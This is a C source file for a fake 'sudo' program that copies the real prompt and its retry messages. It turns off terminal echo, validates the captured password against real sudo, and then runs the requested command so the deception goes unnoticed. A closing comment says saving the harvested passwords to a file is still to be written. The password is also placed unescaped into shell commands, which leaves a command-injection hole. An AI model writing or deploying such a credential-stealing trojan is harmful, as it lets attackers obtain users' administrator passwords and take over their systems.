#define _POSIX_C_SOURCE 200809L
#include<stdio.h>
#include<unistd.h>
#include<termios.h>
#include<string.h>
#include<stdlib.h>
#include<signal.h>
#include<sys/wait.h>

// making sure it operates only on one cpu cycle
volatile sig_atomic_t keepRunning = 1;

void handleInterrupt(int sig) {
    keepRunning = 0;
}



int main(int argc,char *argv[]){
    // variable declaration & structures
    struct termios old_t, new_t;
    char password[64] = {0};
    char cmdbuffer[1024] = {0}; 
    char *user = getlogin();
    char pwdbuf[128] = {0};
    char check[256] = {0};
    // defining the interrupt signal
    signal(SIGINT, handleInterrupt);

    // if no args are defined, the sudo help command will appear, just like the real one
    if (argc < 2) {
        system("sudo");
        return 0;
    }

    // sudo ticket invalidation
    system("sudo -k");
    // real command that will be executed
    for (int i = 1;i < argc;i++){
        strcat(cmdbuffer, argv[i]);
        strcat(cmdbuffer, " ");
    }

    /* 
    copy of the terminal file descriptor configuration 
    and deactivation of the ECHO by reversing the fourth bit
    in the bitmask of the configuration to mimic the sudo secure input  
    */

    tcgetattr(STDIN_FILENO, &old_t);
    new_t = old_t;
    new_t.c_lflag &= ~ECHO;
    
    // mimic of the prompt


    // re-setting the old configuration so it doesn't bug anything
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &new_t);

    
    int attempts = 0;
    int success = 0;
    while (keepRunning && attempts < 3) {
        printf("[sudo] password for %s: ", user);
        fflush(stdout);
        // input
        if (fgets(password, sizeof(password), stdin) != NULL) {
            password[strcspn(password, "\n")] = 0;
        };
        printf("\n");
        // building the command with the passsword
        snprintf(check, sizeof(check), "echo '%s' | sudo -S -v > /dev/null 2>&1", password);
        // assigning the status code to "retval"
        int retval = WEXITSTATUS(system(check));

        // if status codes returns anything other than 0, it attempts again.
        if (retval == 0) {
            success = 1;
            break;
        } else {
            attempts++;
            if (attempts < 3) {
            printf("Sorry, try again.\n");   
            }
        }
    }
    
    // setting termios attributes to the old values
    tcsetattr(STDIN_FILENO, TCSADRAIN, &old_t);
    
    if (!keepRunning) {
        printf("sudo: a password is required");
        exit(1);
    }

    if (success) {
            // fresh buffer and crash protection
            char final_cmd[2048] = {0};
            snprintf(final_cmd, sizeof(final_cmd), "echo '%s' | sudo %s", password, cmdbuffer);
            system(final_cmd);
        } else {
            printf("sudo: %d incorrect password attempts\n", attempts);
        }

    
     // missing the file write part, will do very soon
    
    
    


}
